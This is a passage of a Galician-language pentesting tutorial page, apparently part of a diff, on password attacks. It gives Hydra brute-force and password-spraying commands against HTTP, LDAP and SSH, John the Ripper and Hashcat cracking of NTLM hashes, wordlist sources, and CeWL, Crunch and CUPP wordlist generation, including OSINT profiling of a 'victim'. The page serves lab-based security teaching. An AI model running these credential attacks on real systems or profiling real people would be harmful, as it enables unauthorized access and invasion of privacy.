+<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>hydra<span class="w"> </span>-L<span class="w"> </span>/labs/users.txt<span class="w"> </span>-P<span class="w"> </span>/labs/wordlists/common.txt<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="w">  </span>http-post-form://&lt;TARGET&gt;/login:<span class="s2">&quot;username=^USER^&amp;password=^PASS^:Login failed&quot;</span>
+</span></code></pre></div>
+<p><strong>LDAP bind attempts (diccionario)</strong>:</p>
+<div class="admonition tip">
+<p class="admonition-title">Que son os LDAP bind attempts?</p>
+<p>En LDAP, un <strong>bind</strong> é unha operación de autenticación utilizada para establecer unha sesión válida co servidor.
+Polo tanto, un <em>LDAP bind attempt</em> é simplemente <strong>un intento de login LDAP</strong>.
+Ferramentas como Hydra realizan ataques de diccionario mediante múltiples <em>bind attempts</em>, probando parellas usuario-contrasinal ata atopar unha válida.</p>
+</div>
+<ul>
+<li><em>Hydra</em>:</li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>hydra<span class="w"> </span>-L<span class="w"> </span>/labs/users.txt<span class="w"> </span>-P<span class="w"> </span>/labs/wordlists/ad_common.txt<span class="w"> </span>ldap://&lt;TARGET&gt;
+</span></code></pre></div>
+<p><strong>Password spraying (exemplo SSH con baixa taxa — mesmo enfoque en varias ferramentas)</strong>:</p>
+<ul>
+<li><em>Hydra</em>:</li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>hydra<span class="w"> </span>-L<span class="w"> </span>/labs/users.txt<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Summer2025!&#39;</span><span class="w"> </span>-t<span class="w"> </span><span class="m">1</span><span class="w"> </span>-s<span class="w"> </span><span class="m">22</span><span class="w"> </span>ssh://&lt;TARGET&gt;
+</span></code></pre></div>
+<hr />
+<p><a id="john-the-ripper-offline-diccionario-regras-incremental"></a></p>
+<h3 id="john-the-ripper-offline-diccionario-regras-incremental">John the Ripper (offline — diccionario + regras / incremental)</h3>
+<p><strong>Detección de formatos e listaxe</strong>:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>john<span class="w"> </span>--list<span class="o">=</span>formats
+</span></code></pre></div>
+<p><strong>Diccionario + regras para ficheiro de hashes</strong>:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>john<span class="w"> </span>--wordlist<span class="o">=</span>/labs/wordlists/rockyou.txt<span class="w"> </span>--rules<span class="w"> </span>/labs/hashes/&lt;HASHFILE&gt;
+</span></code></pre></div>
+<p><strong>Modo incremental (forza bruta controlada)</strong>:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>john<span class="w"> </span>--incremental<span class="w"> </span>/labs/hashes/&lt;HASHFILE&gt;
+</span></code></pre></div>
+<p><strong>Mostrar contrasinais recuperados</strong>:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>john<span class="w"> </span>--show<span class="w"> </span>/labs/hashes/&lt;HASHFILE&gt;
+</span></code></pre></div>
+<hr />
+<p><a id="hashcat-offline-gpucpu-dictionary-mask-hybrid"></a></p>
+<h3 id="hashcat-offline-gpucpu-dictionary-mask-hybrid">Hashcat (offline GPU/CPU — dictionary, mask, hybrid)</h3>
+<p><strong>Dictionary attack (NTLM, -m 1000)</strong>:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">1000</span><span class="w"> </span>-a<span class="w"> </span><span class="m">0</span><span class="w"> </span>/labs/hashes/ntlm.txt<span class="w"> </span>/labs/wordlists/rockyou.txt<span class="w"> </span>--session<span class="o">=</span>lab_hashcat
+</span></code></pre></div>
+<p><strong>Mask attack (exemplo: 2 maiúsculas + 4 letras + 2 díxitos)</strong>:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">1000</span><span class="w"> </span>-a<span class="w"> </span><span class="m">3</span><span class="w"> </span>/labs/hashes/ntlm.txt<span class="w"> </span>?u?u?l?l?l?l?d?d
+</span></code></pre></div>
+<p><strong>Hybrid (wordlist + mask)</strong>:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">1000</span><span class="w"> </span>-a<span class="w"> </span><span class="m">6</span><span class="w"> </span>/labs/hashes/ntlm.txt<span class="w"> </span>/labs/wordlists/rockyou.txt<span class="w"> </span>?d?d
+</span></code></pre></div>
+<hr />
+<p><a id="wordlists-recomendadas"></a></p>
+<h2 id="wordlists-recomendadas">Wordlists recomendadas</h2>
+<div class="admonition important">
+<p class="admonition-title">De interese</p>
+<p><a href="https://www.hackingarticles.in/wordlists-for-pentester/" target="_blank">Hacking Articles</a></p>
+</div>
+<p>Nesta sección recóllense algúns dos dicionarios máis empregados en tarefas de pentesting, auditoría de contrasinais e probas de autenticación. Estas wordlists son útiles tanto para forza bruta como para ataques híbridos, password spraying ou análises máis avanzadas.</p>
+<h3 id="1-rockyou">1. <strong>rockyou</strong></h3>
+<p>O famoso dicionario <strong>rockyou.txt</strong> procede dunha das maiores exposicións de contrasinais reais. É un dos máis utilizados debido á variedade e alta prevalencia de patróns que contén.</p>
+<p>Ven preinstalada en Kali Linux (comprimida en <code>/usr/share/wordlists/</code>).</p>
+<div class="admonition tip">
+<p class="admonition-title">Recomendación importante sobre o uso de rockyou.txt</p>
+<p>Moitas plataformas de prácticas, como <strong>VulnYx</strong>, establecen límites para evitar ataques excesivos.<br />
+Segundo as súas normas oficiais:  </p>
+<blockquote>
+<p><strong>“If brute force is required, do not use a password that exceeds the first 5000 lines of rockyou.txt.”</strong><br />
+Fonte: <a href="https://vulnyx.com/rules/#vms" target="_blank">VulnYx Rules</a>  </p>
+</blockquote>
+<p>Isto significa que para desafíos educativos ou laboratorios similares, é recomendable empregar <strong>as primeiras 5000 liñas</strong> ou unha versión filtrada de rockyou.txt para evitar tempos de espera longos e manter prácticas controladas.
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>gunzip<span class="w"> </span>-c<span class="w"> </span>/usr/share/wordlists/rockyou.txt.gz<span class="w"> </span>&gt;<span class="w"> </span>/home/kali/rockyou.txt
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>head<span class="w"> </span>-n<span class="w"> </span><span class="m">5000</span><span class="w"> </span>/home/kali/rockyou.txt<span class="w"> </span>&gt;<span class="w"> </span>/home/kali/5000-rockyou.txt
+</span></code></pre></div></p>
+</div>
+<div class="admonition info">
+<p class="admonition-title">Ligazóns oficiais</p>
+<ul>
+<li>RockYou wordlist en Kali Linux: <a href="https://www.kali.org/tools/wordlists/" target="_blank">https://www.kali.org/tools/wordlists/</a></li>
+<li>Paquete "wordlists": <a href="https://gitlab.com/kalilinux/packages/wordlists" target="_blank">https://gitlab.com/kalilinux/packages/wordlists</a></li>
+</ul>
+</div>
+<hr />
+<h3 id="2-kaonashi">2. <strong>Kaonashi</strong></h3>
+<p>Kaonashi é unha colección masiva e estruturada de wordlists xeradas e compiladas a partir de múltiples fontes públicas. Inclúe listas específicas por idioma, patrón, categoría e uso.</p>
+<div class="admonition info">
+<p class="admonition-title">Ligazón oficial</p>
+<ul>
+<li>Kaonashi Passwords: <a href="https://github.com/kaonashi-passwords/Kaonashi" target="_blank">https://github.com/kaonashi-passwords/Kaonashi</a></li>
+</ul>
+</div>
+<hr />
+<h3 id="3-seclists">3. <strong>SecLists</strong></h3>
+<p><strong>SecLists</strong> é un dos repositorios máis completos para probas de seguridade. Inclúe listas para:</p>
+<ul>
+<li>Usuarios e contrasinais</li>
+<li>Directorios e rutas web</li>
+<li>Payloads</li>
+<li>Nombres de hosts</li>
+<li>Fuzzing</li>
+<li>Ataques comúns</li>
+</ul>
+<p>É un estándar de facto en pentesting e forma parte da instalación por defecto de moitas distros orientadas a seguridade.</p>
+<div class="admonition info">
+<p class="admonition-title">Ligazón oficial</p>
+<ul>
+<li>SecLists Repository: <a href="https://github.com/danielmiessler/SecLists" target="_blank">https://github.com/danielmiessler/SecLists</a></li>
+</ul>
+</div>
+<hr />
+<h3 id="4-wordlists-de-kali-linux-usrsharewordlists">4. <strong>Wordlists de Kali Linux (/usr/share/wordlists)</strong></h3>
+<p>Kali Linux inclúe unha colección ampla de wordlists preinstaladas no directorio:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>/usr/share/wordlists
+</span></code></pre></div>
+<p>Aquí atoparás:</p>
+<ul>
+<li>rockyou.txt (comprimido por defecto)</li>
+<li>SecLists (opcional mediante <code>apt install seclists</code>)</li>
+<li>Listas para WFuzz, Dirbuster e máis ferramentas</li>
+<li>Dicionarios temáticos para IEEE, ciberseguridade, linguas, etc.</li>
+</ul>
+<div class="admonition info">
+<p class="admonition-title">Ligazón oficial</p>
+<ul>
+<li><a href="https://www.kali.org/tools/wordlists/" target="_blank">https://www.kali.org/tools/wordlists/</a>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>$<span class="w"> </span>wordlists<span class="w"> </span>-h<span class="w"> </span>
+</span></code></pre></div></li>
+</ul>
+</div>
+<table>
+<thead>
+<tr>
+<th>Wordlist</th>
+<th>Tamaño aproximado</th>
+<th>Uso recomendado</th>
+<th>Vantaxes</th>
+<th>Inconvenientes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>rockyou.txt</strong></td>
+<td>~14M entradas</td>
+<td>Ataques rápidos, probas comúns</td>
+<td>Alto éxito en contrasinais reais</td>
+<td>Moitas entradas redundantes</td>
+</tr>
+<tr>
+<td><strong>Kaonashi</strong></td>
+<td>moi grande (centos de MB/GB)</td>
+<td>Ataques máis profundos, auditorías profesionais</td>
+<td>Estruturado por categorías</td>
+<td>Pode ser excesivo para prácticas</td>
+</tr>
+<tr>
+<td><strong>SecLists</strong></td>
+<td>variable</td>
+<td>Web, redes, fuzzing, AD</td>
+<td>Colección máis completa</td>
+<td>Require saber que lista usar</td>
+</tr>
+<tr>
+<td><strong>/usr/share/wordlists</strong></td>
+<td>variable</td>
+<td>Ataques rápidos en Kali</td>
+<td>Wordlists dispoñibles de inmediato</td>
+<td>Pode faltar variedade avanzada</td>
+</tr>
+</tbody>
+</table>
+<div class="admonition tip">
+<p class="admonition-title">Boas prácticas ao empregar wordlists</p>
+<ul>
+<li>Usa <strong>versións curtas</strong> cando esteas probando servizos sensibles a bloqueo (SSH, RDP, VPN).  </li>
+<li>Comeza sempre con <strong>rockyou filtrado</strong>, xa que adoita ofrecer un bo equilibrio entre velocidade e efectividade.  </li>
+<li>Para auditorías completas, combina SecLists + Kaonashi para cubrir máis casos reais.  </li>
+<li>Lembra que wordlists enormes poden ser lentas en ferramentas como Hydra ou Medusa; para Hashcat e John adoitan rendir mellor.  </li>
+</ul>
+</div>
+<hr />
+<p><a id="xeracion-wordlists"></a></p>
+<h2 id="xeracion-de-wordlists">Xeración de Wordlists</h2>
+<div class="admonition important">
+<p class="admonition-title">De interese</p>
+<p><a href="https://www.hackingarticles.in/wordlists-for-pentester/" target="_blank">Hacking Articles</a></p>
+</div>
+<p>En moitas ocasións, as wordlists xenéricas non son suficientes para comprometer contrasinais específicas dun obxectivo. A xeración de wordlists personalizadas permite crear dicionarios adaptados ao contexto da vítima, aumentando significativamente as probabilidades de éxito.</p>
+<h3 id="1-cewl-custom-word-list-generator">1. <strong>CeWL (Custom Word List generator)</strong></h3>
+<div class="admonition note">
+<p class="admonition-title">Instalación e execución en Kali Linux</p>
+<p><strong>CeWL</strong> ven preinstalado en Kali Linux e pode executarse directamente desde a terminal:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>cewl<span class="w"> </span>--help
+</span></code></pre></div></p>
+</div>
+<p><strong>CeWL</strong> é unha ferramenta que extrae palabras de sitios web para crear wordlists personalizadas. É especialmente útil cando se busca información específica do obxectivo (nomes de produtos, terminoloxía da empresa, etc.).</p>
+<h4 id="caracteristicas-principais">Características principais:</h4>
+<ul>
+<li>Extrae palabras de páxinas web mediante spidering</li>
+<li>Admite configuración de profundidade de rastrexo</li>
+<li>Pode seguir ligazóns externas</li>
+<li>Permite establecer lonxitude mínima/máxima de palabras</li>
+<li>Admite autenticación básica e digest</li>
+</ul>
+<h4 id="exemplos-de-uso">Exemplos de uso:</h4>
+<p><strong>Extracción básica dunha web:</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>cewl<span class="w"> </span>http://&lt;TARGET&gt;<span class="w"> </span>-w<span class="w"> </span>/labs/wordlists/custom_wordlist.txt
+</span></code></pre></div></p>
+<p><strong>Extracción con profundidade e lonxitude mínima:</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>cewl<span class="w"> </span>http://&lt;TARGET&gt;<span class="w"> </span>-d<span class="w"> </span><span class="m">3</span><span class="w"> </span>-m<span class="w"> </span><span class="m">6</span><span class="w"> </span>-w<span class="w"> </span>/labs/wordlists/custom_deep.txt
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="c1"># -d 3: profundidade de 3 niveis</span>
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="c1"># -m 6: palabras de mínimo 6 caracteres</span>
+</span></code></pre></div></p>
+<p><strong>Extracción con autenticación:</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>cewl<span class="w"> </span>http://&lt;TARGET&gt;/admin<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span>password123<span class="w"> </span>-w<span class="w"> </span>/labs/wordlists/admin_words.txt
+</span></code></pre></div></p>
+<p><strong>Extraer emails ademais de palabras:</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>cewl<span class="w"> </span>http://&lt;TARGET&gt;<span class="w"> </span>-e<span class="w"> </span>-w<span class="w"> </span>/labs/wordlists/words.txt<span class="w"> </span>-n<span class="w"> </span>/labs/wordlists/emails.txt
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="c1"># -e: activa extracción de emails</span>
+</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a><span class="c1"># -n: ficheiro para gardar emails</span>
+</span></code></pre></div></p>
+<p><strong>Seguir ligazóns externas:</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>cewl<span class="w"> </span>http://&lt;TARGET&gt;<span class="w"> </span>-o<span class="w"> </span>-d<span class="w"> </span><span class="m">2</span><span class="w"> </span>-w<span class="w"> </span>/labs/wordlists/external.txt
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="c1"># -o: seguir ligazóns externas</span>
+</span></code></pre></div></p>
+<div class="admonition tip">
+<p class="admonition-title">Boas prácticas con CeWL</p>
+<ul>
+<li>Combina CeWL con regras de John the Ripper ou Hashcat para xerar variantes</li>
+<li>Usa <code>-m 8</code> para filtrar palabras curtas e reducir o tamaño da wordlist</li>
+<li>Para sitios grandes, limita a profundidade (<code>-d 2</code> ou <code>-d 3</code>) para evitar listas excesivamente longas</li>
+</ul>
+</div>
+<hr />
+<h3 id="2-crunch-pattern-based-wordlist-generator">2. <strong>Crunch (Pattern-based wordlist generator)</strong></h3>
+<div class="admonition note">
+<p class="admonition-title">Instalación e execución en Kali Linux</p>
+<p><strong>Crunch</strong> ven preinstalado en Kali Linux e pode executarse directamente desde a terminal:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>crunch<span class="w"> </span>--help
+</span></code></pre></div></p>
+</div>
+<p><strong>Crunch</strong> é unha ferramenta para xerar wordlists baseadas en patróns específicos. É ideal cando coñeces a estrutura ou formato do contrasinal obxectivo.</p>
+<h4 id="caracteristicas-principais_1">Características principais:</h4>
+<ul>
+<li>Xera wordlists con lonxitude específica</li>
+<li>Admite patróns personalizados con caracteres especiais</li>
+<li>Permite especificar conxuntos de caracteres (maiúsculas, minúsculas, números, símbolos)</li>
+<li>Pode xerar listas enormes (varios GB) directamente ou mediante pipe</li>
+</ul>
+<h4 id="sintaxe-basica">Sintaxe básica:</h4>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>crunch<span class="w"> </span>&lt;min&gt;<span class="w"> </span>&lt;max&gt;<span class="w"> </span><span class="o">[</span>charset<span class="o">]</span><span class="w"> </span>-o<span class="w"> </span>&lt;outputfile&gt;
+</span></code></pre></div>
+<h4 id="exemplos-de-uso_1">Exemplos de uso:</h4>
+<p><strong>Xerar wordlist de 4 a 6 caracteres (minúsculas):</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>crunch<span class="w"> </span><span class="m">4</span><span class="w"> </span><span class="m">6</span><span class="w"> </span>-o<span class="w"> </span>/labs/wordlists/crunch_4-6.txt
+</span></code></pre></div></p>
+<p><strong>Xerar wordlist só con números (PINs de 4 díxitos):</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>crunch<span class="w"> </span><span class="m">4</span><span class="w"> </span><span class="m">4</span><span class="w"> </span><span class="m">0123456789</span><span class="w"> </span>-o<span class="w"> </span>/labs/wordlists/pins.txt
+</span></code></pre></div></p>
+<p><strong>Usar patrón específico (2 letras + 4 números):</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>crunch<span class="w"> </span><span class="m">6</span><span class="w"> </span><span class="m">6</span><span class="w"> </span>-t<span class="w"> </span>@@%%%%<span class="w"> </span>-o<span class="w"> </span>/labs/wordlists/pattern.txt
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a><span class="c1"># @: minúscula</span>
+</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a><span class="c1"># ,: maiúscula</span>
+</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a><span class="c1"># %: número</span>
+</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a><span class="c1"># ^: símbolo</span>
+</span></code></pre></div></p>
+<p><strong>Xerar variantes dunha palabra base:</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>crunch<span class="w"> </span><span class="m">8</span><span class="w"> </span><span class="m">8</span><span class="w"> </span>-t<span class="w"> </span>Password@%<span class="w"> </span>-o<span class="w"> </span>/labs/wordlists/password_variants.txt
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="c1"># Xerará: Password@0, Password@1, ..., Password@9</span>
+</span></code></pre></div></p>
+<p><strong>Usar charset personalizado:</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>crunch<span class="w"> </span><span class="m">6</span><span class="w"> </span><span class="m">8</span><span class="w"> </span>abc123!@#<span class="w"> </span>-o<span class="w"> </span>/labs/wordlists/custom_charset.txt
+</span></code></pre></div></p>
+<p><strong>Xerar e enviar directamente a unha ferramenta (sen crear ficheiro):</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>&lt;<span class="o">(</span>crunch<span class="w"> </span><span class="m">4</span><span class="w"> </span><span class="m">6</span><span class="o">)</span><span class="w"> </span>ssh://&lt;TARGET&gt;<span class="w"> </span>-t<span class="w"> </span><span class="m">4</span><span class="w"> </span>-w<span class="w"> </span><span class="m">1</span>
+</span></code></pre></div></p>
+<p><strong>Limitar o tamaño do ficheiro de saída:</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>crunch<span class="w"> </span><span class="m">6</span><span class="w"> </span><span class="m">8</span><span class="w"> </span>-b<span class="w"> </span>100mb<span class="w"> </span>-o<span class="w"> </span>/labs/wordlists/crunch_split
+</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="c1"># Divide en ficheiros de 100MB</span>
+</span></code></pre></div></p>
+<div class="admonition warning">
+<p class="admonition-title">Avisos importantes sobre Crunch</p>
+<ul>
+<li><strong>As wordlists poden ser ENORMES</strong>. Por exemplo, <code>crunch 8 8</code> con alfanuméricos xera centos de GB.</li>
+<li>Sempre estima o tamaño antes usando a opción <code>-c</code> (count) sen <code>-o</code>:
+  <div class="language-bash highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>crunch<span class="w"> </span><span class="m">8</span><span class="w"> </span><span class="m">8</span><span class="w"> </span>-c<span class="w"> </span><span class="m">1000</span>
+</span></code></pre></div></li>
+<li>Considera usar pipes para evitar crear ficheiros masivos no disco.</li>
+</ul>
+</div>
+<hr />
+<h3 id="3-cupp-common-user-passwords-profiler">3. <strong>CUPP (Common User Passwords Profiler)</strong></h3>
+<div class="admonition note">
+<p class="admonition-title">Instalación e execución en Kali Linux</p>
+<p><strong>CUPP</strong> require instalación manual mediante git:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="nb">cd</span><span class="w"> </span>/opt
+</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>sudo<span class="w"> </span>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/Mebus/cupp.git
+</span><span id="__span-37-3"><a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a><span class="nb">cd</span><span class="w"> </span>cupp
+</span><span id="__span-37-4"><a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a>python3<span class="w"> </span>cupp.py<span class="w"> </span>-h
+</span></code></pre></div></p>
+<p>Para crear alias permanente e facilitar o uso:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;alias cupp=&#39;python3 /opt/cupp/cupp.py&#39;&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>~/.zshrc
+</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a><span class="nb">source</span><span class="w"> </span>~/.zshrc
+</span></code></pre></div></p>
+</div>
+<p><strong>CUPP</strong> é unha ferramenta interactiva que xera wordlists personalizadas baseándose en información persoal da vítima (nome, data de nacemento, mascota, etc.). É moi efectiva en ataques de enxeñería social e contextos onde os usuarios empregan información persoal nas súas contrasinais.</p>
+<h4 id="caracteristicas-principais_2">Características principais:</h4>
+<ul>
+<li>Modo interactivo con preguntas guiadas</li>
+<li>Xera variantes automáticas (maiúsculas, números ao final, etc.)</li>
+<li>Admite modo non interactivo con ficheiros de configuración</li>
+<li>Pode descargar wordlists comúns desde internet</li>
+</ul>
+<h4 id="exemplos-de-uso_2">Exemplos de uso:</h4>
+<p><strong>Modo interactivo (recomendado para principiantes):</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>cupp<span class="w"> </span>-i
+</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a><span class="c1"># Responde as preguntas sobre a vítima:</span>
+</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a><span class="c1"># - Nome, apelidos</span>
+</span><span id="__span-39-4"><a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a><span class="c1"># - Mascota</span>
+</span><span id="__span-39-5"><a id="__codelineno-39-5" name="__codelineno-39-5" href="#__codelineno-39-5"></a><span class="c1"># - Data de nacemento</span>
+</span><span id="__span-39-6"><a id="__codelineno-39-6" name="__codelineno-39-6" href="#__codelineno-39-6"></a><span class="c1"># - Palabras clave</span>
+</span><span id="__span-39-7"><a id="__codelineno-39-7" name="__codelineno-39-7" href="#__codelineno-39-7"></a><span class="c1"># - Etc.</span>
+</span></code></pre></div></p>
+<p><strong>Descargar wordlists comúns de referencia:</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>cupp<span class="w"> </span>-l
+</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a><span class="c1"># Descarga listas de nomes comúns, lugares, etc.</span>
+</span></code></pre></div></p>
+<p><strong>Xerar wordlist desde ficheiro de configuración:</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>cupp<span class="w"> </span>-w<span class="w"> </span>&lt;configfile&gt;
+</span></code></pre></div></p>
+<p><strong>Exemplo de perfil persoal (información recollida):</strong></p>
+<p>Supoñamos que sabemos o seguinte dunha vítima:<br />
+- Nome: María<br />
+- Apelidos: González López<br />
+- Mascota: Luna<br />
+- Data de nacemento: 15/03/1985<br />
+- Hobby: tenis  </p>
+<p>CUPP xerará variantes como:
+<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>maria1985
+</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>mariagonzalez
+</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>MariaTenis!
+</span><span id="__span-42-4"><a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a>Luna2024
+</span><span id="__span-42-5"><a id="__codelineno-42-5" name="__codelineno-42-5" href="#__codelineno-42-5"></a>gonzalez15
+</span><span id="__span-42-6"><a id="__codelineno-42-6" name="__codelineno-42-6" href="#__codelineno-42-6"></a>maria@luna
+</span></code></pre></div></p>
+<div class="admonition tip">
+<p class="admonition-title">Información útil para CUPP</p>
+<p>Recollendo información de <strong>OSINT</strong> (redes sociais, LinkedIn, blogs persoais) pódese obter datos moi útiles:<br />
+- Nomes de familiares e mascotas<br />
+- Datas relevantes (aniversarios, graduacións)<br />
+- Equipos deportivos favoritos<br />
+- Lugares visitados<br />
+- Hobbies e intereses  </p>
+</div>
+<hr />
+<h3 id="taboa-comparativa-de-ferramentas">Táboa comparativa de ferramentas</h3>
+<table>
+<thead>
+<tr>
+<th>Ferramenta</th>
+<th>Tipo de xeración</th>
+<th>Mellor uso</th>
+<th>Vantaxes</th>
+<th>Inconvenientes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>CeWL</strong></td>
+<td>Extracción web</td>
+<td>Recoller vocabulario do obxectivo</td>
+<td>Personalización alta</td>
+<td>Dependente da calidade do sitio</td>
+</tr>
+<tr>
+<td><strong>Crunch</strong></td>
+<td>Patróns e combinacións</td>
